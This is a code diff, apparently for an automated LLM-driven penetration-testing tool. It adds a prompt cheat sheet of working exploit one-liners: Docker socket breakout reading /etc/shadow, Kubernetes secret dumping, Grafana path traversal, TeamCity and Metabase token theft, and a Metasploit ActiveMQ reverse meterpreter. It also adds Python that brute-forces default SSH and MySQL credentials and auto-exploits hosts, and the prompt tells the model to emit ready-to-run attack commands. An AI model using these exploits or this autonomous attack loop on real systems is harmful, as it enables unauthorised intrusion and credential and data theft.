@@ -8910,12 +8910,48 @@ crackmapexec smb SUBNET/24 -u USERS -p PASSWORDS --continue-on-success 2>/dev/nu
 - Redis PONG → config set dir /root/.ssh → write authorized_keys
 - MS17-010 detected → use exploit/windows/smb/ms17_010_eternalblue IMMEDIATELY
 - .git/ exposed → git-dumper or manual reconstruction → search for passwords in code
-- Spring Boot /actuator/env → extract DB passwords, API keys
+- Spring Boot /actuator/env → extract DB passwords, API keys → try as SSH/DB creds
 - H2 Console exposed → JDBC URL injection → RCE
 - Jenkins script console → def p="id".execute(); println(p.text)
 - SQLi login form → ' OR '1'='1'-- as username → try for auth bypass
 - SSTI found → {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 - JWT found → alg:none bypass OR hashcat -m 16500 jwt.txt rockyou.txt
+- Docker 2375 open → docker -H tcp://TARGET:2375 run --rm -v /:/mnt alpine chroot /mnt sh -c 'id; cat /root/root.txt'
+- Kubernetes API anon → kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify get secrets --all-namespaces
+- Grafana 3000 → curl -u admin:admin http://TARGET:3000/api/org && if success → CVE-2021-43798 path traversal
+- ActiveMQ 61616 → MSF exploit/multi/misc/apache_activemq_rce_cve_2023_46604 IMMEDIATELY
+- Jupyter 8888 → POST /api/kernels → create kernel → execute Python code
+- TeamCity 8111 → POST /app/rest/users/id:1/tokens/RPC2 → get admin token → RCE
+- Metabase 3000 → GET /api/session/properties → get setup-token → JDBC RCE
+- Grafana CVE-2021-43798: curl --path-as-is 'http://TARGET:3000/public/plugins/alertlist/../../../etc/passwd'
+- MinIO 9000: POST /minio/health/cluster → get MINIO_SECRET_KEY
+- Prometheus 9090: GET /api/v1/targets → enumerate internal endpoints → SSRF
+- Exchange OWA → ProxyShell: use exploit/windows/http/exchange_proxyshell_rce
+- Solr 8983 → use exploit/multi/http/solr_velocity_rce
+- Cacti → use exploit/linux/http/cacti_unauthenticated_cmd_injection
+- FortiGate /remote/login → CVE-2022-40684: curl -H 'User-Agent: Report Runner' -H 'Forwarded: for=127.0.0.1;by=127.0.0.1'
+- Zabbix → SAML bypass CVE-2022-23131 → base64 session cookie with Admin username
+
+═══ 2023-2024 CVE EXPLOITS ═══
+[ActiveMQ CVE-2023-46604]
+- Port 61616: msfconsole -q -x 'use exploit/multi/misc/apache_activemq_rce_cve_2023_46604; set RHOSTS TARGET; set RPORT 61616; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT LPORT; run; sleep 15; {linux_post}; exit' 2>/dev/null
+
+[TeamCity CVE-2023-42793]
+- curl -s -X POST http://TARGET:8111/app/rest/users/id:1/tokens/RPC2 | python3 -c 'import sys,json; print(json.load(sys.stdin).get("value",""))'
+- Use token: curl -s -H "Authorization: Bearer TOKEN" http://TARGET:8111/app/rest/users
+
+[Metabase CVE-2023-38646]
+- TOKEN=$(curl -s http://TARGET:3000/api/session/properties | python3 -c 'import sys,json; print(json.load(sys.stdin).get("setup-token",""))')
+- Then POST to /api/setup/validate with H2 JDBC payload
+
+[Grafana CVE-2021-43798]
+- curl --path-as-is 'http://TARGET:3000/public/plugins/alertlist/../../../../../../../../../etc/passwd'
+
+[Docker no-TLS]
+- docker -H tcp://TARGET:2375 run --rm -v /:/mnt alpine chroot /mnt sh -c 'cat /root/root.txt; cat /etc/shadow'
+
+[Kubernetes anon]
+- kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify exec $(kubectl get pods -A -o name | head -1) -- id
 
 RESPOND ONLY WITH VALID JSON (no markdown, no prose, no explanation outside JSON):
 {
@@ -8925,7 +8961,7 @@ RESPOND ONLY WITH VALID JSON (no markdown, no prose, no explanation outside JSON
   "next_action": {
     "type": "command|done",
     "command": "COMPLETE shell command ready to copy-paste and execute — no placeholders, use actual IP/port/creds",
-    "tool": "nmap|metasploit|hydra|crackmapexec|enum4linux|nikto|nuclei|curl|ssh|ftp|redis-cli|mysql|impacket|certipy|other",
+    "tool": "nmap|metasploit|hydra|crackmapexec|enum4linux|nikto|nuclei|curl|ssh|ftp|redis-cli|mysql|impacket|certipy|docker|kubectl|other",
     "reason": "1-line justification of WHY this is the best next action (reference specific evidence)"
   }
 }
@@ -19435,8 +19471,64 @@ http:
                     }], target)
                     self._log(f"[Fallback] ✔ Archivo sensible expuesto: {path}")
 
-        # ── 6. Run vuln chain one final time with full context ────────────
-        self._log("[Fallback] Ejecutando vuln-chain final con contexto completo...")
+        # ── 6. Auto-exploit by version (deterministic) ───────────────────
+        self._log("[Fallback] Fase 6: Auto-exploits por versión...")
+        self._auto_exploit_by_version(target, open_ports, accumulated_output)
+
+        # ── 7. Default credentials for common services ────────────────────
+        self._log("[Fallback] Fase 7: Credenciales por defecto en servicios...")
+        port_set_full = {p if isinstance(p, int) else p.get("port", 0) for p in open_ports}
+        default_creds = [
+            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
+            ("admin", "admin123"), ("root", "root"), ("root", "toor"),
+            ("root", "password"), ("admin", ""), ("administrator", "password"),
+            ("guest", "guest"), ("test", "test"), ("user", "user"),
+        ]
+        for user, pwd in default_creds:
+            if 22 in port_set_full:
+                ssh_out, _ = self._run_cmd(
+                    f"fallback-default-ssh-{user}",
+                    f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
+                    f"{user}@{target} 'id; hostname' 2>/dev/null",
+                    target, timeout=12,
+                )
+                if "uid=" in ssh_out:
+                    self._capture_evidence(ssh_out, target, "fallback-default-ssh", f"ssh {user}:{pwd}")
+                    self._post_exploit_chain(target, user, pwd, accumulated_output)
+                    break
+            if 3306 in port_set_full:
+                mysql_out, _ = self._run_cmd(
+                    f"fallback-default-mysql-{user}",
+                    f"mysql -h {target} -u '{user}' -p'{pwd}' -e 'show databases;' 2>/dev/null | head -5",
+                    target, timeout=10,
+                )
+                if "database" in mysql_out.lower() or "information_schema" in mysql_out.lower():
+                    self._save_findings([{
+                        "title": f"MySQL Default Creds: {user}:{pwd} @ {target}:3306",
+                        "severity": "critical",
+                        "description": f"MySQL acepta credenciales por defecto {user}:{pwd}",
+                        "cve": "",
+                    }], target)
+                    break
+
+        # ── 8. Targeted nuclei scan ───────────────────────────────────────
+        http_ports_fallback = [p if isinstance(p, int) else p.get("port", 0) for p in open_ports]
+        for hp in [p for p in http_ports_fallback if p in (80, 443, 8080, 8443, 8000, 8888)][:2]:
+            proto = "https" if hp in (443, 8443) else "http"
+            nucl_out, _ = self._run_cmd(
+                f"fallback-nuclei-{hp}",
+                f"nuclei -u {proto}://{target}:{hp} -severity critical,high -j "
+                f"-no-update-check -timeout 10 2>/dev/null | head -30",
+                target, timeout=120,
+            )
+            if nucl_out.strip():
+                parsed = _parse_tool_output("nuclei", nucl_out, target, "fallback-nuclei")
+                if parsed.get("findings"):
+                    self._save_findings(parsed["findings"], target)
+                accumulated_output.append(f"=== Nuclei Fallback {hp} ===\n{nucl_out[:400]}")
+
+        # ── 9. Run vuln chain one final time with full context ────────────
+        self._log("[Fallback] Fase 9: Vuln chain final con contexto completo...")
         self._vuln_chain_engine(target, open_ports, accumulated_output)
 
         self._log("[Fallback] ══ Post-explotación determinística completada ══")
